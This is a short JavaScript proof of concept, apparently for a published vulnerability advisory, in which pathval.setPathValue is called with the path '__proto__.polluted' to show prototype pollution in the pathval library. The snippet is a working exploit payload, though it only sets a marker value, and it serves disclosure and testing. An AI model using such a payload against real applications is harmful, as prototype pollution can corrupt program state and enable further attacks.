//https://snyk.io/vuln/SNYK-JS-PATHVAL-596926
 
  var pathval = require("pathval");

  var obj = {};
   

  pathval.setPathValue(obj, "__proto__.polluted", "yes");
// End of file
